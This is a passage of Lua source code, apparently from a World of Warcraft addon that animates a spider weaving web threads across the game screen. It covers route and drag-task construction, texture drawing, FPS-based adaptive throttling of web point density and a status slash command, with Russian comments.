    local route = nil
    if directPath and fallbackLength and directLen <= fallbackLength then
        route = {
            points = directPath,
            length = actualLen(directPath),
            kind = "direct",
        }
    elseif topPath then
        route = {
            points = topPath,
            length = actualLen(topPath) + math.abs(sh - to.y),
            kind = "drop",
            dropToTarget = true,
            dropFrom = {
                x = topX,
                y = sh,
            },
        }
    elseif directPath then
        route = {
            points = directPath,
            length = actualLen(directPath),
            kind = "direct",
        }
    end
    if route then
        local fromSup = self:NP_FindSupportAt(from.x, from.y)
        local toSup = self:NP_FindSupportAt(to.x, to.y)
        S.nspLastRoute = {
            fromName = self:NP_SupportDescription(fromSup),
            toName = self:NP_SupportDescription(toSup),
            count = route.points and #route.points or 0,
            length = route.length or 0,
            kind = route.kind or "?",
        }
    end
    return route
end

function NSPauk:NP_MakePlanTask(kind, from, to, conn, owner)
    return {
        kind = (kind == "thread") and "thread" or "travel",
        nspPlan = true,
        drop = false,
        p0 = copyPoint(from),
        p1 = {
            x = (from.x + to.x) / 2,
            y = (from.y + to.y) / 2,
        },
        p2 = copyPoint(to),
        conn = conn,
        owner = owner,
        nspNoInsert = true,
    }
end

function NSPauk:NP_CopyPlanTask(task)
    local copy = {}

    for k, v in pairs(task) do
        copy[k] = v
    end

    copy.nspAttempts = (task.nspAttempts or 0) + 1

    copy.p0 = task.p0 and copyPoint(task.p0) or nil
    copy.p1 = task.p1 and copyPoint(task.p1) or nil
    copy.p2 = task.p2 and copyPoint(task.p2) or nil

    copy._nspCurSupportAt = nil
    copy._nspCurSupportOK = nil
    copy._nspPreFallInserted = nil
    copy._nspSupportLostHandled = nil
    copy._nspSupportLostConsumed = nil

    return copy
end

function NSPauk:NP_MakeFallTask(from, to)
    local fromC = {
        x = from.x or 0,
        y = from.y or 0,
    }

    local toY = tonumber(to and to.y) or 0

    if toY > fromC.y - 1 then
        toY = math.max(0, fromC.y - 1)
    end

    local toC = {
        x = fromC.x,
        y = toY,
    }

    return {
        kind = "travel",
        nspFall = true,
        nspNoSupportCheck = true,
        nspNoInsert = true,
        drop = false,
        p0 = {
            x = fromC.x,
            y = fromC.y,
        },
        p1 = {
            x = fromC.x,
            y = (fromC.y + toC.y) / 2,
        },
        p2 = {
            x = toC.x,
            y = toC.y,
        },
    }
end

function NSPauk:NP_MakeTempDropTask(from, to)
    return self:NP_MakeFallTask(from, to)
end

function NSPauk:NP_MakeStartDragTask(task, anchor)
    local finalThread = task.finalThread

    if not finalThread then
        finalThread = {
            p0 = copyPoint(anchor),
            p1 = copyPoint(task.p1),
            p2 = copyPoint(task.p2),
        }
    end

    local t = {
        kind = "travel",
        nspStartDragTask = true,
        nspDuringDrag = true,
        nspNoInsert = true,

        drop = false,

        p0 = {
            x = anchor.x or 0,
            y = anchor.y or 0,
        },
        p1 = {
            x = anchor.x or 0,
            y = anchor.y or 0,
        },
        p2 = {
            x = anchor.x or 0,
            y = anchor.y or 0,
        },

        owner = task.owner,
        conn = task.conn,
        finalThread = finalThread,
        isCross = task.isCross,
        isMain = task.isMain,
    }

    local supA = self:NP_FindSupportAt(t.p0.x, t.p0.y)
    if supA then
        t.nspSupportA = supA
    end

    if finalThread and finalThread.p2 then
        local supB = self:NP_FindSupportAt(finalThread.p2.x, finalThread.p2.y)
        if supB then
            t.nspSupportB = supB
        end
    end

    return t
end

function NSPauk:NP_InvalidateRouteCaches(thread, owner)
    local S = self.S

    if thread then
        thread._nspMapSamples = nil
        thread._nspMapTexCount = nil
        thread._nspColPts = nil
        thread._nspColIgnore = nil
    end

    if owner and owner.thread then
        owner.thread._nspMapSamples = nil
        owner.thread._nspMapTexCount = nil
        owner.thread._nspColPts = nil
        owner.thread._nspColIgnore = nil
    end

    S.nspSupportCache = nil
    S.nspNearCache = nil
end

function NSPauk:NP_DropPermanentThread(owner, thread)
    if not owner or not owner.alive or not thread then
        return
    end

    if not owner.textures then
        owner.textures = {}
    end

    local th = thread

    if not th.p1 then
        th = {
            p0 = th.p0,
            p1 = {
                x = (th.p0.x + th.p2.x) / 2,
                y = (th.p0.y + th.p2.y) / 2,
            },
            p2 = th.p2,
        }
    end

    local total = self:ApproxThreadLength(th)

    if total <= 0 then
        return
    end

    local spacing = self:GetWebPointSpacingForTask({ owner = owner })

    if type(spacing) ~= "number" or spacing ~= spacing or spacing <= 0 then
        spacing = 1
    end

    local density = self:NP_GetWebDensityOffset()

    local maxSpacing = math.max(2.5, 1 + density)

    if maxSpacing > 4 then
        maxSpacing = 4
    end

    if spacing > maxSpacing then
        spacing = maxSpacing
    end

    if spacing < 1 then
        spacing = 1
    end

    local count = math.floor(total / spacing) + 1

    if count < 2 then
        count = 2
    end

    local maxGap = math.max(spacing, 2.5)

    if maxGap > 4 then
        maxGap = 4
    end

    local minCount = math.floor(total / maxGap) + 2

    if count < minCount then
        count = minCount
    end

    local hard = math.max(5000, minCount)

    if hard > 12000 then
        hard = 12000
    end

    if count > hard then
        count = hard
    end

    local dropTask = {
        owner = owner,
        drop = true,
    }

    for i = 0, count - 1 do
        local t = i / (count - 1)
        local x, y = self:BzThread(th, t)
        self:DropWebForTask(dropTask, x, y)
    end

    self:NP_InvalidateRouteCaches(thread, owner)
end

function NSPauk:NP_KillOwnerHard(owner)
    if not owner then
        return
    end

    local inst = self:GetOwnerInstance(owner)
    local isSeg = owner.connA or owner.parentSegA or owner.isInterCross

    if isSeg then
        if owner.alive then
            self:KillSeg(owner)
        else
            if inst and inst.interSegs then
                for _, inter in ipairs(inst.interSegs) do
                    if inter.alive
                        and (inter.parentSegA == owner or inter.parentSegB == owner) then
                        self:KillSeg(inter)
                    end
                end
            end
        end
    else
        if owner.alive and inst then
            self:KillConnection(inst, owner)
        elseif inst then
            for _, seg in ipairs(inst.crossSegs) do
                if seg.alive and (seg.connA == owner or seg.connB == owner) then
                    self:KillSeg(seg)
                end
            end

            self:CheckInstanceDead(inst)
        else
            owner.alive = false
        end
    end
end

function NSPauk:NP_ClearGlobalDrag(fade)
    local S = self.S
    local drag = S.nspDrag

    if not drag then
        return
    end

    local owner = drag.owner
    local list = drag.textures or {}

    if fade and #list > 0 then
        self:AddFade(list, self.C.TEAR_FADE_DURATION or 1.5, nil)
    else
        self:RecycleTextures(list)
    end

    S.nspDrag = nil

    if owner and (not owner.textures or #owner.textures == 0) then
        self:NP_KillOwnerHard(owner)
    end
end

function NSPauk:NP_StartDrag(task)
    local S = self.S
    if S.nspDrag and S.nspDrag.owner == task.owner then
        return
    end
    if S.nspDrag then
        self:NP_ClearGlobalDrag(false)
    end
    local finalThread = task.finalThread
    if not finalThread then
        finalThread = {
            p0 = copyPoint(task.p0),
            p1 = copyPoint(task.p1),
            p2 = copyPoint(task.p2),
        }
    end

    S.nspDragFps = nil
    S.nspDragVisualAt = nil
    S.nspDrag = {
        anchor = copyPoint(task.p0),
        owner = task.owner,
        finalThread = finalThread,
        textures = {},
        temp = false,
    }
end

function NSPauk:NP_FinishGlobalDrag(task)
    local S = self.S
    local drag = S.nspDrag

    if not drag then
        return
    end

    local thread = drag.finalThread
    local owner = drag.owner

    if drag.owner and drag.owner.alive and drag.finalThread then
        self:NP_DropPermanentThread(drag.owner, drag.finalThread)
    end

    self:NP_ClearGlobalDrag(false)

    if self.CheckPointLimit then
        self:CheckPointLimit()
    end

    self:NP_InvalidateRouteCaches(thread, owner)

    if owner
        and not owner._nspCrossCounted
        and (owner.connA or owner.connB or owner.isHeal or owner.isInterCross) then
        local inst = self:GetOwnerInstance(owner)

        if inst
            and inst == S.currentInstance
            and not inst.torn
            and not inst.isCocoon
            and not inst.isMoth
            and owner.textures
            and #owner.textures > 0 then
            owner._nspCrossCounted = true

            inst.builtCrossCount = (inst.builtCrossCount or 0) + 1

            if (inst.builtCrossCount % 10) == 0 then
                local now = GetTime()

                if not inst.lastTriSectorRecheckAt
                    or (now - inst.lastTriSectorRecheckAt) >= 0.75 then
                    inst.lastTriSectorRecheckAt = now
                    self:NP_RecheckWebSectorsByTriangles(inst)
                end
            end
        end
    end
end

function NSPauk:NP_IsWebAnchorAlive(rect)
    local inst = rect and rect.webInst

    if not inst or inst.torn then
        return false
    end

    if rect.webHub then
        return self:InstanceHasAliveConn(inst)
    end

    if rect.webConn then
        return rect.webConn.alive
            and rect.webConn.textures ~= nil
            and #rect.webConn.textures > 0
    end

    return self:InstanceHasAliveConn(inst)
end

function NSPauk:NP_CollectWebAnchorItems()
    local S = self.S
    local C = self.C

    local items = {}

    local minSize = tonumber(C.MIN_ANCHOR_SIZE) or 14
    if minSize < 8 then
        minSize = 8
    end

    for _, inst in ipairs(S.instances or {}) do
        if not inst.torn and self:InstanceHasAliveConn(inst) then
            local hasDrawn = false

            for _, conn in ipairs(inst.conns or {}) do
                if conn.alive
                    and conn.textures
                    and #conn.textures > 0 then
                    hasDrawn = true
                    break
                end
            end

            if hasDrawn then

                if inst.hub and inst.hub.rect then
                    local r = inst.hub.rect

                    local cx = r.cx or ((r.left + r.right) / 2)
                    local cy = r.cy or ((r.bottom + r.top) / 2)

                    local w = math.max(minSize, r.width or minSize, 18)
                    local h = math.max(minSize, r.height or minSize, 18)

                    items[#items + 1] = {
                        name = "NSPaukWebHub",
                        frame = nil,
                        left = cx - w / 2,
                        right = cx + w / 2,
                        bottom = cy - h / 2,
                        top = cy + h / 2,
                        width = w,
                        height = h,
                        cx = cx,
                        cy = cy,
                        webInst = inst,
                        webHub = true,
                        virtualId = "webhub-" .. tostring(inst.id),
                    }
                end

                local count = 0

                for _, conn in ipairs(inst.conns or {}) do
                    if count >= 8 then
                        break
                    end

                    if conn.alive
                        and conn.textures
                        and #conn.textures > 0
                        and conn.thread
                        and conn.thread.p2 then
                        local p = conn.thread.p2

                        local w = minSize
                        local h = minSize

                        items[#items + 1] = {
                            name = "NSPaukWebThread",
                            frame = nil,
                            left = p.x - w / 2,
                            right = p.x + w / 2,
                            bottom = p.y - h / 2,
                            top = p.y + h / 2,
                            width = w,
                            height = h,
                            cx = p.x,
                            cy = p.y,
                            webInst = inst,
                            webConn = conn,
                            virtualId = "webconn-"
                                .. tostring(inst.id)
                                .. "-"
                                .. tostring(conn.id),
                        }

                        count = count + 1
                    end
                end
            end
        end
    end

    return items
end

function NSPauk:NP_UpdateDragTextures(list, anchor, current, vertical)
    local S = self.S
    local C = self.C

    if not list or not anchor or not current then
        return
    end

    if not S.activeFrame then
        return
    end

    local dx = current.x - anchor.x
    local dy = current.y - anchor.y
    local len = math.sqrt(dx * dx + dy * dy)

    if len < 1 then
        for i = 1, #list do
            list[i]:Hide()
        end
        return
    end

    local webSize = tonumber(C.WEB_SIZE) or 2
    local baseAlpha = tonumber(C.WEB_ALPHA) or 0.55
    local alpha = math.min(0.95, baseAlpha + 0.35)

    local density = self:NP_GetWebDensityOffset()

    local step = math.max(1 + density, webSize * 0.65)

    local count = math.floor(len / step) + 1

    if count < 2 then
        count = 2
    end

    local cap = vertical and 700 or 2200

    -- При высокой плотности дополнительно снижаем потолок точек.
    if density > 0 then
        cap = math.floor(cap / (1 + density * 0.25))
    end

    if count > cap then
        count = cap
    end

    local visibleCount = count

    if #list > visibleCount then
        local surplus = {}

        for i = visibleCount + 1, #list do
            surplus[#surplus + 1] = list[i]
        end

        self:RecycleTextures(surplus)

        for i = #list, visibleCount + 1, -1 do
            list[i] = nil
        end
    end

    while #list < visibleCount do
        local tex

        if #S.webPool > 0 then
            tex = table.remove(S.webPool)

            if tex then
                tex._nspInPool = false
            end
        else
            tex = S.activeFrame:CreateTexture(nil, "OVERLAY")

            if tex then
                S.webCreated = (S.webCreated or 0) + 1
            end
        end

        if not tex then
            visibleCount = #list
            break
        end

        tex:SetTexture(C.TEX_WEB)
        tex:SetDrawLayer("OVERLAY")
        tex:SetVertexColor(1, 1, 1, 1)
        tex:SetWidth(webSize)
        tex:SetHeight(webSize)

        list[#list + 1] = tex
    end

    if visibleCount < 1 then
        for i = 1, #list do
            list[i]:Hide()
        end
        return
    end

    local actualStep = len / (count - 1)
    local drawSize = math.max(webSize * 1.6, actualStep * 1.5)

    local p1

    if vertical then
        p1 = {
            x = anchor.x,
            y = (anchor.y + current.y) / 2,
        }
    else
        local sag = len * 0.10

        if sag < 2 then
            sag = 2
        end

        p1 = {
            x = (anchor.x + current.x) / 2,
            y = (anchor.y + current.y) / 2 - sag,
        }
    end

    for i = 1, #list do
        local tex = list[i]

        if i <= visibleCount then
            local t = (i - 1) / (count - 1)

            if t < 0 then
                t = 0
            elseif t > 1 then
                t = 1
            end

            local x = self:Bz(t, anchor.x, p1.x, current.x)
            local y = self:Bz(t, anchor.y, p1.y, current.y)

            tex:ClearAllPoints()
            tex:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)
            tex:SetWidth(drawSize)
            tex:SetHeight(drawSize)
            tex:SetAlpha(alpha)
            tex:Show()
        else
            tex:Hide()
        end
    end
end

local function readClientFps()
    local fps = GetFramerate and GetFramerate() or 60
    if type(fps) ~= "number" or fps ~= fps or fps <= 0 then
        fps = 60
    end
    return fps
end

function NSPauk:NP_UpdateDragThrottle(now)
    local S = self.S
    local C = self.C

    local st = S.nspDragFps

    if not st then
        st = {
            smooth = 0,
            lastSampleAt = 0,
            interval = tonumber(C.DRAG_UPDATE_MIN) or 0.016,
            density = 0,
            lowCount = 0,
            highCount = 0,
        }
        S.nspDragFps = st
    end

    if type(st.density) ~= "number" or st.density ~= st.density or st.density < 0 then
        st.density = 0
    end

    if st.density > 2 then
        st.density = 2
    end

    st.lowCount = math.floor(tonumber(st.lowCount) or 0)
    st.highCount = math.floor(tonumber(st.highCount) or 0)

    -- Первое измерение после старта нити: инициализируем без истории.
    if st.smooth <= 0 then
        st.smooth = readClientFps()
        st.lastSampleAt = now
        st.interval = tonumber(C.DRAG_UPDATE_MIN) or 0.016
        return st
    end

    local sampleEvery = tonumber(C.DRAG_FPS_SAMPLE) or 0.4

    if sampleEvery < 0.1 then
        sampleEvery = 0.1
    end

    if (now - (st.lastSampleAt or 0)) < sampleEvery then
        return st
    end

    st.lastSampleAt = now

    -- Сглаженный FPS, чтобы одиночный провал не включал троттлинг.
    st.smooth = st.smooth * 0.55 + readClientFps() * 0.45

    local target = tonumber(C.DRAG_FPS_TARGET) or 40
    local recover = tonumber(C.DRAG_FPS_RECOVER) or 48
    local minInterval = tonumber(C.DRAG_UPDATE_MIN) or 0.016
    local maxInterval = tonumber(C.DRAG_UPDATE_MAX) or 0.25

    if st.smooth < target then
        st.lowCount = st.lowCount + 1
        st.highCount = 0

        -- FPS ниже порога: рисуем всё реже и реже.
        st.interval = math.min(st.interval * 1.7 + 0.01, maxInterval)

        -- Если FPS продолжает проседать, уменьшаем плотность точек.
        if (st.lowCount >= 3 or st.interval >= maxInterval) and st.density < 2 then
            st.density = st.density + 1
            st.lowCount = 0
        end
    elseif st.smooth >= recover then
        st.highCount = st.highCount + 1
        st.lowCount = 0

        -- FPS выровнялся: плавно возвращаемся к нормальной отрисовке.
        if st.interval > minInterval then
            st.interval = math.max(st.interval * 0.65, minInterval)
        end

        -- После устойчивого восстановления возвращаем плотность точек.
        if st.highCount >= 4 and st.density > 0 then
            st.density = st.density - 1
            st.highCount = 0
        end
    else
        st.lowCount = 0
        st.highCount = 0
    end

    return st
end

function NSPauk:NP_GetWebDensityOffset()
    local S = self.S
    local density = 0

    if self:NP_IsAdaptiveEnabled() then
        local adaptive = self:NP_GetAdaptiveDB()
        local d = math.floor(tonumber(adaptive.density) or 0 + 0.5)

        if d > density then
            density = d
        end
    end

    -- Drag-плотность учитываем только пока реально тянем нить,
    -- чтобы она не оставалась "навсегда" после завершения перетаскивания.
    if S.nspDrag then
        local st = S.nspDragFps

        if st and type(st.density) == "number" and st.density == st.density then
            local d = math.floor(st.density + 0.5)

            if d > density then
                density = d
            end
        end
    end

    if density < 0 then
        density = 0
    end

    if density > 2 then
        density = 2
    end

    return density
end

function NSPauk:NP_UpdateGlobalDrag()
    local S = self.S
    local drag = S.nspDrag

    if not drag then
        return
    end

    if drag.owner and not drag.owner.alive then
        self:NP_ClearGlobalDrag(true)
        return
    end

    self:NP_UpdateDragTextures(
        drag.textures,
        drag.anchor,
        {
            x = S.lastSpiderX or 0,
            y = S.lastSpiderY or 0,
        },
        false
    )
end

function NSPauk:NP_ClearTempOwners()
    local S = self.S

    if not S.nspTempOwners then
        S.nspTempOwners = {}
    end

    for _, owner in ipairs(S.nspTempOwners) do
        owner.alive = false
    end

    S.nspTempOwners = {}
end

function NSPauk:NP_FreshHasSupportAt(x, y)
    return self:NP_NearSupportWithin(x, y, self:NP_GetGap() * 1.25)
end

function NSPauk:NP_NearSupportWithin(x, y, tol)
    local S = self.S

    if type(tol) ~= "number" or tol ~= tol or tol < 0 then
        tol = self:NP_GetGap()
    end

    local now = GetTime()

    local rx = math.floor((x or 0) / 4 + 0.5)
    local ry = math.floor((y or 0) / 4 + 0.5)
    local rt = math.floor(tol + 0.5)

    local needUI = self:NP_RouteNeedsUIParent() and 1 or 0

    local cache = S.nspNearCache
    if cache
        and now - (cache.t or 0) < 0.18
        and cache.x == rx
        and cache.y == ry
        and cache.tol == rt
        and cache.ctx == needUI then
        return cache.ok
    end

    local ok = false

    local sw, sh = self:GetScreenSize()
    local gap = self:NP_GetGap()

    local edgeTol = math.min(tol, gap)

    if x <= edgeTol
        or x >= sw - edgeTol
        or y <= edgeTol
        or y >= sh - edgeTol then
        ok = true
    end

    if not ok and needUI == 1 then
        if x >= -tol
            and x <= sw + tol
            and y >= -tol
            and y <= sh + tol then
            ok = true
        end
    end

    if not ok then
        local rects = self:NP_EnsureFrameCache()

        for _, r in ipairs(rects) do
            if x >= r.left - tol
                and x <= r.right + tol
                and y >= r.bottom - tol
                and y <= r.top + tol then
                ok = true
                break
            end
        end
    end

    if not ok then
        local checked = 0
        local found = false

        for _, inst in ipairs(S.instances) do
            if inst.conns then
                for _, conn in ipairs(inst.conns) do
                    if conn.alive and conn.thread then
                        checked = checked + 1

                        if self:NP_ThreadWithinDist(conn.thread, conn, x, y, tol) then
                            found = true
                            break
                        end
                    end
                end
            end

            if found then
                break
            end

            if inst.crossSegs then
                for _, seg in ipairs(inst.crossSegs) do
                    if seg.alive and seg.thread then
                        checked = checked + 1

                        if self:NP_ThreadWithinDist(seg.thread, seg, x, y, tol) then
                            found = true
                            break
                        end
                    end
                end
            end

            if found or checked >= 64 then
                break
            end
        end

        if found then
            ok = true
        end
    end

    S.nspNearCache = {
        t = now,
        x = rx,
        y = ry,
        tol = rt,
        ctx = needUI,
        ok = ok,
    }

    return ok
end

function NSPauk:NP_GetAdaptiveDB()
    local db = self.DB

    if type(db) ~= "table" then
        db = self:EnsureDB()
    end

    if type(db.adaptive) ~= "table" then
        db.adaptive = {
            enabled = true,
            level = 0,
            interval = 0,
            density = 0,
        }
    end

    local adaptive = db.adaptive

    if type(adaptive.density) ~= "number"
        or adaptive.density ~= adaptive.density
        or adaptive.density < 0 then
        adaptive.density = 0
    end

    adaptive.density = math.floor(adaptive.density + 0.5)

    if adaptive.density > 2 then
        adaptive.density = 2
    end

    return adaptive
end

function NSPauk:NP_IsAdaptiveEnabled()
    local db = self:NP_GetAdaptiveDB()
    if db.enabled == false then
        return false
    end
    local C = self.C or {}
    if tonumber(C.ADAPTIVE_ENABLED) == 0 then
        return false
    end
    return true
end

function NSPauk:NP_GetAdaptiveInterval()
    if not self:NP_IsAdaptiveEnabled() then
        return 0
    end

    local db = self:NP_GetAdaptiveDB()
    local C = self.C or {}

    local interval = tonumber(db.interval) or 0
    if interval < 0 then
        interval = 0
    end

    local step = tonumber(C.ADAPTIVE_STEP) or 0.05
    if step <= 0 then
        step = 0.05
    end

    local maxInterval = tonumber(C.ADAPTIVE_MAX_INTERVAL) or 0.5
    if maxInterval < step then
        maxInterval = step
    end

    local level = math.floor(tonumber(db.level) or 0 + 0.5)
    if level < 0 then
        level = 0
    end

    if level > 0 then
        local expected = math.min(level * step, maxInterval)
        if interval < expected then
            interval = expected
        end
    end

    if interval > maxInterval then
        interval = maxInterval
    end

    return interval
end

function NSPauk:NP_SaveAdaptive(level, interval)
    local db = self:NP_GetAdaptiveDB()
    local C = self.C or {}

    local step = tonumber(C.ADAPTIVE_STEP) or 0.05
    if step <= 0 then
        step = 0.05
    end

    local maxInterval = tonumber(C.ADAPTIVE_MAX_INTERVAL) or 0.5
    if maxInterval < step then
        maxInterval = step
    end

    level = math.floor(tonumber(level) or 0 + 0.5)
    interval = tonumber(interval) or 0

    if level < 0 then
        level = 0
    end

    local maxLevel = math.max(0, math.floor(maxInterval / step + 0.5))
    if level > maxLevel then
        level = maxLevel
    end

    interval = math.min(level * step, maxInterval)

    if interval < 0 then
        interval = 0
    end

    if db.level ~= level or db.interval ~= interval then
        db.level = level
        db.interval = interval
    end
end

function NSPauk:NP_UpdateAdaptive(dt)
    local S = self.S

    if type(S) ~= "table" then
        return
    end

    if not self.initialized or S.runtimeOff or S.phase == "off" then
        return
    end

    if S.combatHide then
        return
    end

    if not self:NP_IsAdaptiveEnabled() then
        S.adaptive = nil
        return
    end

    local C = self.C or {}

    if type(S.adaptive) ~= "table" then
        S.adaptive = {
            timer = 0,
            sum = 0,
            min = math.huge,
            samples = 0,
        }
    end

    local st = S.adaptive

    dt = tonumber(dt) or 0

    if dt < 0 then
        dt = 0
    end

    if dt > 0.25 then
        dt = 0.25
    end

    local fps = GetFramerate and GetFramerate() or 60

    if type(fps) ~= "number" or fps ~= fps or fps <= 0 then
        fps = 60
    end

    st.sum = (st.sum or 0) + fps
    st.samples = (st.samples or 0) + 1

    if type(st.min) ~= "number" or st.min ~= st.min or fps < st.min then
        st.min = fps
    end

    st.timer = (st.timer or 0) + dt

    local checkEvery = tonumber(C.ADAPTIVE_CHECK) or 1.0

    if checkEvery < 0.25 then
        checkEvery = 1.0
    end

    if st.timer < checkEvery then
        return
    end

    local avg = st.sum / math.max(1, st.samples)
    local minFps = st.min

    st.timer = 0
    st.sum = 0
    st.min = math.huge
    st.samples = 0

    local target = tonumber(C.ADAPTIVE_FPS_MIN) or 29
    local step = tonumber(C.ADAPTIVE_STEP) or 0.05
    local maxInterval = tonumber(C.ADAPTIVE_MAX_INTERVAL) or 0.5

    if step <= 0 then
        step = 0.05
    end

    if maxInterval < step then
        maxInterval = step
    end

    local maxLevel = math.max(1, math.floor(maxInterval / step + 0.5))

    local adaptive = self:NP_GetAdaptiveDB()

    local level = math.floor(tonumber(adaptive.level) or 0 + 0.5)

    if level < 0 then
        level = 0
    end

    if level > maxLevel then
        level = maxLevel
    end

    local density = math.floor(tonumber(adaptive.density) or 0 + 0.5)

    if density < 0 then
        density = 0
    end

    if density > 2 then
        density = 2
    end

    local lowFps = avg < target or minFps < (target - 3)

    if lowFps then
        if level < maxLevel then
            level = level + 1
        end

        local interval = math.min(level * step, maxInterval)

        -- Если интервал уже максимальный или FPS очень низкий,
        -- дополнительно уменьшаем плотность точек паутины.
        if (level >= maxLevel or minFps < (target - 8)) and density < 2 then
            density = density + 1
        end

        self:NP_SaveAdaptive(level, interval)
    else
        local interval = 0

        if level > 0 then
            interval = math.min(level * step, maxInterval)
        end

        -- При стабильно высоком FPS сначала возвращаем плотность точек.
        if avg >= (target + 8) and density > 0 then
            density = density - 1
        end

        self:NP_SaveAdaptive(level, interval)
    end

    adaptive.density = density
end

function NSPauk:HandleAdaptiveCommand(msg)
    msg = type(msg) == "string" and msg or ""
    msg = msg:gsub("^%s+", "")
    msg = msg:gsub("%s+$", "")

    local db = self:NP_GetAdaptiveDB()

    if msg == "" or msg == "status" then
        local fps = GetFramerate and GetFramerate() or 0

        self:Echo(string.format(
            "Адаптация: %s, FPS=%.1f, интервал=%.3f сек, уровень=%d, порог=%d, макс=%.2f",
            db.enabled and "вкл" or "выкл",
            fps,
            tonumber(db.interval) or 0,
            tonumber(db.level) or 0,
            tonumber((self.C or {}).ADAPTIVE_FPS_MIN) or 29,
            tonumber((self.C or {}).ADAPTIVE_MAX_INTERVAL) or 0.5
        ))
        return
    end

    if msg == "on" then
        db.enabled = true
        self:Echo("Адаптивный режим включён.")
        return
    end

    if msg == "off" then
        db.enabled = false
        self:Echo("Адаптивный режим выключен.")
        return
    end

    if msg == "reset" then
        self:NP_SaveAdaptive(0, 0)
        self.S.adaptive = nil
        self:Echo("Адаптивный интервал сброшен.")
        return
    end

    self:Echo("Команды: /nspadapt [status|on|off|reset]")
end

function NSPauk:NP_RouteNeedsUIParent()
    local S = self.S
    if type(S) ~= "table" then
        return false
    end

    local inst = S.currentInstance
    if inst
        and inst.isCocoon
        and not inst.isMoth
        and inst.hub
        and inst.hub.frame == UIParent then
        return true
    end

    if S.cocoon
        and S.cocoon.isUIParent
        and S.cocoon.inst
        and not S.cocoon.inst.isMoth then
        return true
    end

    return false
end

function NSPauk:NP_InsertCocoonEntryApproach(inst)
    if not inst or not inst.isCocoon or inst.isMoth then
        return
    end

    if type(inst.tasks) ~= "table" then
        return
    end

    local first = inst.tasks[1]
    if not first
        or not first.p0
        or type(first.p0.x) ~= "number"
        or type(first.p0.y) ~= "number" then
        return
    end

    local cur = self:NP_GetSpiderPointIfShown()
    if not cur then
        return
    end

    local tol = self:NP_GetAntiTeleportTolerance()
    local dx = first.p0.x - cur.x
    local dy = first.p0.y - cur.y

    if dx * dx + dy * dy <= tol * tol then
        return
    end

    local plan = self:NP_MakePlanTask(
        "travel",
        {
            x = cur.x,
            y = cur.y,
        },
        {
            x = first.p0.x,
            y = first.p0.y,
        },
        first.conn,
        first.owner
    )

    plan.nspCocoonEntryPlan = true

    table.insert(inst.tasks, 1, plan)
end

function NSPauk:GetWebPointSpacingForTask(task)
    local C = self.C or {}

    local spacing = self:GetWebPointSpacing()

    if type(spacing) ~= "number" or spacing ~= spacing or spacing <= 0 then
        spacing = 1
    end

    local webSize = tonumber(C.WEB_SIZE) or 2

    if webSize < 1 then
        webSize = 2
    end

    local density = self:NP_GetWebDensityOffset()

    -- Базовый визуальный предел.
    local maxVisual = math.max(1, math.min(2.5, webSize)) + density

    -- При просадке FPS принудительно увеличиваем шаг точек:
    -- density 1 -> минимум 2 px, density 2 -> минимум 3 px.
    spacing = math.max(spacing, 1 + density)

    if spacing > maxVisual then
        spacing = maxVisual
    end

    if spacing < 1 then
        spacing = 1
    end

    return spacing
end

function NSPauk:NP_PostUpdate()
    local S = self.S

    if type(S) ~= "table" then
        return
    end

    if not self.initialized or S.runtimeOff or S.phase == "off" then
        return
    end

    if S.combatHide then
        return
    end

    if S.phase == "task" then
        local task = S.currentTask

        if task then
            local needDrag = S.nspDrag and task.nspDuringDrag

            if needDrag then
                local now = GetTime()

                local adaptiveInterval = self:NP_GetAdaptiveInterval()

                if type(adaptiveInterval) ~= "number" or adaptiveInterval < 0 then
                    adaptiveInterval = 0
                end

                local throttle = self:NP_UpdateDragThrottle(now)
                local throttleInterval = tonumber(throttle and throttle.interval) or 0

                if throttleInterval < 0 then
                    throttleInterval = 0
                end

                local interval = math.max(adaptiveInterval, throttleInterval)

                if interval <= 0
                    or not S.nspDragVisualAt
                    or (now - S.nspDragVisualAt) >= interval then

                    S.nspDragVisualAt = now
                    self:NP_UpdateGlobalDrag()
                end
            end
        end

        if S.nspDrag then
            local activeDragTask = task and task.nspDuringDrag

            if not activeDragTask then
                self:NP_ClearGlobalDrag(true)
            end
        end
    else
        if S.nspDrag then
            local task = S.currentTask
            local activeDragTask = task and task.nspDuringDrag

            if not activeDragTask then
                self:NP_ClearGlobalDrag(true)
            end
        end
    end

    if S.phase == "task" or S.phase == "instanceComplete" then
        local inst = S.currentInstance

        local activeDrag = S.nspDrag
            and S.currentTask
            and S.currentTask.nspDuringDrag

        if inst
            and inst.isNaturalRing
            and not inst.torn
            and not activeDrag
            and not S.nspQueueRebuildRunning
            and (inst.nspRingCrossQueueDirty or S.nspRingQueueRebuildPending)
            and self:NP_AreRingMainsDrawn(inst) then

            S.nspRingQueueRebuildPending = false

            local priority = S.nspRingQueuePriority
            S.nspRingQueuePriority = nil

            self:NP_RebuildRingCrossQueue(inst, priority)
        end

        if S.nspSectorRecheckPending then
            S.nspSectorRecheckPending = false

            local recheckInst = S.nspSectorRecheckInst or S.currentInstance
            S.nspSectorRecheckInst = nil

            if recheckInst and recheckInst == S.currentInstance then
                self:NP_RecheckWebSectors(recheckInst)
            end
        end

        if S.nspQueueResumePending then
            self:NP_ProcessQueueResume()
        end

        if S.phase == "instanceComplete" and not S.nspQueueResumePending then
            local pendingInst = S.currentInstance

            if pendingInst
                and not pendingInst.torn
                and not pendingInst.isCocoon
                and not pendingInst.isMoth then

                if self:NP_HasRequiredWebPending(pendingInst) then
                    self:NP_RequestQueueResume(pendingInst, nil)
                    self:NP_ProcessQueueResume()
                end
            end
        end
    end
end

function NSPauk:NP_PickRingAnchorsOnce(pool, targetCount)
    local S = self.S
    local SW = S.SW or 0
    local SH = S.SH or 0
    if SW <= 0 or SH <= 0 then
        SW, SH = self:GetScreenSize()
    end
    if SW <= 0 or SH <= 0 then
        return nil
    end
    targetCount = math.floor(tonumber(targetCount) or 4)
    if targetCount < 4 then
        targetCount = 4
    end
    local gridDim = targetCount
    if gridDim < 4 then
        gridDim = 4
    end
    if gridDim > 12 then
        gridDim = 12
    end
    local twoPi = math.pi * 2
    local function normAngle(a)
        while a < 0 do
            a = a + twoPi
        end
        while a >= twoPi do
            a = a - twoPi
        end
        return a
    end
    local cells = {}
    local maxR2 = 0
    local minCenterDist = math.min(SW, SH) * 0.05
    for gy = 1, gridDim do
        for gx = 1, gridDim do
            local left = (gx - 1) * SW / gridDim
            local right = gx * SW / gridDim
            local bottom = (gy - 1) * SH / gridDim
            local top = gy * SH / gridDim
            local cx = (left + right) / 2
            local cy = (bottom + top) / 2
            local dx = cx - SW / 2
            local dy = cy - SH / 2
